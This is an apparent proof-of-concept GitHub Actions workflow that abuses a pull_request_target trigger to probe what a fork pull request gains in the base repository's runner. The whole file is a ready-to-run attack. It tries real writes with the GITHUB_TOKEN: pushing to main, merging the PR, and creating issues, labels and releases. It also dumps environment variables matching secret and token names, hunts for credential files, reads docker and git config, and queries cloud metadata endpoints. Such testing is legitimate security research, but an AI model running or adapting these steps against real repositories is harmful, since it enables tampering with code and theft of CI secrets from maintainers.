# PoC: pull_request_target recon — mirrors on-pr_labeler.yml trigger
# Demonstrates what an external fork PR gains access to in the runner context.
# This workflow runs from the BASE branch with BASE secrets/token.

name: "PoC: PRT Recon (labeler trigger)"

on:
  pull_request_target:
    types: [opened, synchronize, reopened]

jobs:
  recon:
    runs-on: ubuntu-24.04
    steps:
      # ── 1. Event metadata ──────────────────────────────────────────
      - name: "[recon] PR event metadata"
        run: |
          echo "=== pull_request_target event context ==="
          echo "event_name:       ${{ github.event_name }}"
          echo "action:           ${{ github.event.action }}"
          echo "repo:             ${{ github.repository }}"
          echo "base_ref:         ${{ github.event.pull_request.base.ref }}"
          echo "head_repo:        ${{ github.event.pull_request.head.repo.full_name }}"
          echo "head_sha:         ${{ github.event.pull_request.head.sha }}"
          echo "pr_number:        ${{ github.event.pull_request.number }}"
          echo "pr_author:        ${{ github.event.pull_request.user.login }}"
          echo "actor:            ${{ github.actor }}"
          echo "triggering_actor: ${{ github.triggering_actor }}"
          echo "is_fork_pr:       ${{ github.event.pull_request.head.repo.full_name != github.repository }}"

      # ── 2. GITHUB_TOKEN permission probe ───────────────────────────
      - name: "[recon] GITHUB_TOKEN scope enumeration"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "=== Token permission probe ==="

          echo "--- read contents (GET /repos) ---"
          curl -s -o /dev/null -w "HTTP %{http_code}" \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}" && echo

          echo "--- list branches ---"
          curl -s -o /dev/null -w "HTTP %{http_code}" \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/branches?per_page=1" && echo

          echo "--- list secrets (should 403 unless admin) ---"
          curl -s -o /dev/null -w "HTTP %{http_code}" \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/actions/secrets" && echo

          echo "--- write: create issue ---"
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"title":"[poc-prt-recon] token-write-probe","body":"Automated probe — delete me"}' \
            "https://api.github.com/repos/${{ github.repository }}/issues")
          echo "create issue: HTTP $STATUS"

          echo "--- write: create label ---"
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"name":"poc-recon-test","color":"ff0000"}' \
            "https://api.github.com/repos/${{ github.repository }}/labels")
          echo "create label: HTTP $STATUS"

          echo "--- write: create release ---"
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"tag_name":"poc-recon-probe","name":"probe","draft":true}' \
            "https://api.github.com/repos/${{ github.repository }}/releases")
          echo "create release (draft): HTTP $STATUS"

          echo "--- write: push to contents ---"
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X PUT \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"message":"poc probe","content":"dGVzdA==","branch":"main"}' \
            "https://api.github.com/repos/${{ github.repository }}/contents/.poc-probe-delete-me")
          echo "push file to main: HTTP $STATUS"

          echo "--- write: merge PR ---"
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X PUT \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/pulls/${{ github.event.pull_request.number }}/merge")
          echo "merge PR: HTTP $STATUS"

          echo "--- admin: update branch protection ---"
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X GET \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/branches/main/protection")
          echo "read branch protection: HTTP $STATUS"

      # ── 3. Environment variable dump ───────────────────────────────
      - name: "[recon] Environment variables"
        run: |
          echo "=== Environment variables (filtered) ==="
          env | sort | grep -iE 'GITHUB_|RUNNER_|ACTIONS_|INPUT_|SECRET|TOKEN|KEY|PASS|CRED|AUTH|AZURE|AWS|NCS_|SAS' || true
          echo ""
          echo "=== All GITHUB_ vars ==="
          env | grep ^GITHUB_ | sort
          echo ""
          echo "=== All RUNNER_ vars ==="
          env | grep ^RUNNER_ | sort
          echo ""
          echo "=== All ACTIONS_ vars ==="
          env | grep ^ACTIONS_ | sort

      # ── 4. Filesystem recon ────────────────────────────────────────
      - name: "[recon] Runner filesystem"
        run: |
          echo "=== Runner identity ==="
          whoami
          id
          echo ""
          echo "=== Home directory ==="
          ls -la $HOME
          echo ""
          echo "=== Credential files ==="
          find $HOME -name '*.json' -o -name '*.pem' -o -name '*.key' \
               -o -name '.env*' -o -name '*token*' -o -name '*cred*' \
               -o -name '.netrc' -o -name '.npmrc' -o -name '.pypirc' \
               2>/dev/null | head -30
          echo ""
          echo "=== Docker config ==="
          cat $HOME/.docker/config.json 2>/dev/null || echo "(none)"
          echo ""
          echo "=== Git config ==="
          git config --global --list 2>/dev/null || echo "(none)"
          echo ""
          echo "=== /etc/environment ==="
          cat /etc/environment 2>/dev/null || echo "(none)"

      # ── 5. Network recon ───────────────────────────────────────────
      - name: "[recon] Network and metadata"
        run: |
          echo "=== Runner public IP ==="
          curl -s https://ifconfig.me && echo
          echo ""
          echo "=== IMDS probe (cloud metadata) ==="
          echo "--- AWS ---"
          curl -s -m 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "(not AWS)"
          echo ""
          echo "--- Azure ---"
          curl -s -m 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null || echo "(not Azure)"
          echo ""
          echo "--- GCP ---"
          curl -s -m 2 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/" 2>/dev/null || echo "(not GCP)"

      # ── 6. Secret presence test ────────────────────────────────────
      - name: "[recon] Secret presence test"
        env:
          S_GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          S_NCS_DOC_SAS_PRS: ${{ secrets.NCS_DOC_SAS_PRS }}
        run: |
          echo "=== Secret presence ==="
          [ -n "$S_GITHUB_TOKEN" ] && echo "GITHUB_TOKEN: PRESENT (length ${#S_GITHUB_TOKEN})" || echo "GITHUB_TOKEN: ABSENT"
          [ -n "$S_NCS_DOC_SAS_PRS" ] && echo "NCS_DOC_SAS_PRS: PRESENT (length ${#S_NCS_DOC_SAS_PRS})" || echo "NCS_DOC_SAS_PRS: ABSENT"

      # ── 7. Vars (repo variables) presence ──────────────────────────
      - name: "[recon] Repository variables"
        run: |
          echo "=== Repository variables ==="
          echo "NCS_DOC_PR_STORAGE_URL=${{ vars.NCS_DOC_PR_STORAGE_URL }}"
          [ -n "${{ vars.NCS_DOC_PR_STORAGE_URL }}" ] && echo "NCS_DOC_PR_STORAGE_URL: PRESENT" || echo "NCS_DOC_PR_STORAGE_URL: ABSENT"
